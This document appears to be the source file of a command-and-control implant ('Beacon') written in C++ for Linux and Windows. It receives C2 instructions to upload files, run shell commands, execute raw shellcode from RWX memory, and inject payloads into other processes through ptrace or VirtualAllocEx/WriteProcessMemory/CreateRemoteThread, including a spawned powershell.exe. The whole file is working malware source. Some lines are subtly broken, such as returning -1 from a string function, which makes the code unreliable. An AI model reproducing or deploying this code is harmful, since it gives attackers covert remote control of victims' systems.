#include "Beacon.hpp"


#ifdef __linux__ 
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#elif _WIN32
// windows code goes here
#endif

#define BUFSIZE 2048 

using namespace std;


std::string Beacon::execAsembly(const std::string& payload)
{
	std::string result;

#ifdef __linux__ 

	void* exec = mmap(NULL, payload.size(), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	memcpy(exec, payload.data(), payload.size());
	((int (*)()) exec)();

#elif _WIN32

	std::cout << "exec-assembly size payload " << payload.size() << std::endl;

	HANDLE g_hChildStd_IN_Rd = NULL;
	HANDLE g_hChildStd_IN_Wr = NULL;
	HANDLE g_hChildStd_OUT_Rd = NULL;
	HANDLE g_hChildStd_OUT_Wr = NULL;

	SECURITY_ATTRIBUTES saAttr;
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0);
	SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);

	TCHAR szCmdline[] = TEXT("powershell.exe");
	PROCESS_INFORMATION piProcInfo;
	STARTUPINFO siStartInfo;
	BOOL bSuccess = FALSE;

	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdError = g_hChildStd_OUT_Wr;
	siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	bSuccess = CreateProcess(NULL, szCmdline, NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo);
	int pid = piProcInfo.dwProcessId;

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	std::cout << "Injection " << piProcInfo.dwProcessId << std::endl;

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, payload.data(), payload.size(), NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);

	if (!bSuccess)
		std::cout << "CreateProcess" << std::endl;
	else
	{
		CloseHandle(piProcInfo.hProcess);
		CloseHandle(piProcInfo.hThread);
		CloseHandle(g_hChildStd_OUT_Wr);
		CloseHandle(g_hChildStd_IN_Rd);
	}

	COMMTIMEOUTS timeouts = { 0,  0, 10, 0, 0};
	SetCommTimeouts(g_hChildStd_OUT_Rd, &timeouts);

	int timeOutSec = 60;
	int idx = 0;
	while (1)
	{
		DWORD threadExitCode;
		GetExitCodeThread(remoteThread, &threadExitCode);
		if (threadExitCode != STILL_ACTIVE)
			break;

		std::this_thread::sleep_for(std::chrono::seconds(1));
		idx++;
		if(idx*2> timeOutSec)
			break;
	}

	DWORD dwRead, dwWritten;
	CHAR chBuf[BUFSIZE];
	bSuccess = FALSE;
	//HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

	for (;;)
	{
		bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);

		for (int i = 0; i < dwRead; i++)
			result.push_back(TEXT(chBuf[i]));

		if (!bSuccess || dwRead == 0) 
			break;

		//bSuccess = WriteFile(hParentStdOut, chBuf, dwRead, &dwWritten, NULL);
		//if (!bSuccess) 
		//	break;
	}

	TerminateProcess(processHandle, 0);
	CloseHandle(piProcInfo.hProcess);
	CloseHandle(piProcInfo.hThread);
	CloseHandle(g_hChildStd_OUT_Wr);
	CloseHandle(g_hChildStd_IN_Rd);

#endif

	return result;
}


std::string Beacon::inject(int pid, const std::string& payload)
{
	std::string result;

#ifdef __linux__ 

	pid_t target = pid;

	if ((ptrace(PTRACE_ATTACH, target, NULL, NULL)) < 0)
	{
		perror("ptrace(PTRACE_ATTACH)");
		return -1;
	}

	printf("Wait for process...\n");
	wait(NULL);


	struct user_regs_struct regs;
	if ((ptrace(PTRACE_GETREGS, target, NULL, &regs)) < 0)
	{
		perror("ptrace(PTRACE_GETREGS)");
		return -1;
	}

	printf("Code injection...\n");

	uint32_t* s = (uint32_t*)payload.data();
	uint32_t* d = (uint32_t*)regs.rip;

	for (int i = 0; i < payload.size(); i += 4, s++, d++)
	{
		if ((ptrace(PTRACE_POKETEXT, pid, d, *s)) < 0)
		{
			perror("ptrace(PTRACE_POKETEXT)");
			return -1;
		}
	}

	regs.rip += 2;

#elif _WIN32

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	std::cout << "Injection " << pid << std::endl;

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, payload.data(), payload.size(), NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);

#endif

	return result;
}


std::string Beacon::execBash(const string& cmd)
{
	std::string result;

#ifdef __linux__ 

	std::array<char, 128> buffer;

	std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
	if (!pipe)
	{
		throw std::runtime_error("popen() filed!");
	}
	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
	{
		result += buffer.data();
	}

#elif _WIN32

	std::array<char, 128> buffer;

	std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);
	if (!pipe)
	{
		throw std::runtime_error("popen() filed!");
	}
	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
	{
		result += buffer.data();
	}

#endif

	return result;
}


Beacon::Beacon(std::string& ip, int port)
{
	m_ip = ip;
	m_port = port;

}


Beacon::~Beacon()
{

}


bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
{
	string instruction = c2Message.instruction();

	if (instruction == "upload")
	{
		std::string outputFile = c2Message.outputfile();
		std::ofstream output(outputFile, std::ios::binary);

		const std::string buffer = c2Message.data();
		output << buffer;
		output.close();
	}
	else if (instruction == "exec-assembly")
	{
		const std::string buffer = c2Message.data();

		std::string outCmd = execAsembly(buffer);

		c2RetMessage.set_instruction(instruction);
		c2RetMessage.set_returnvalue(outCmd);
	}
	else if (instruction == "script")
	{
		const std::string buffer = c2Message.data();

		std::string outCmd = execBash(buffer);

		c2RetMessage.set_instruction(instruction);
		c2RetMessage.set_returnvalue(outCmd);
	}
	else if (instruction == "inject")
	{
		const std::string buffer = c2Message.data();
		int pid = c2Message.pidinjection();

		std::unique_ptr<std::thread> threadExec(new std::thread(&Beacon::inject, this, pid, buffer));
		m_threadsExec.push_back(std::move(threadExec));
	}
	else if (instruction == "run")
	{
		string shellCmd = c2Message.shellcmd();
		std::string outCmd = execBash(shellCmd);

		c2RetMessage.set_instruction(instruction);
		c2RetMessage.set_shellcmd(shellCmd);
		c2RetMessage.set_returnvalue(outCmd);
	}
	else if (instruction == "end")
		return true;

	return false;
}



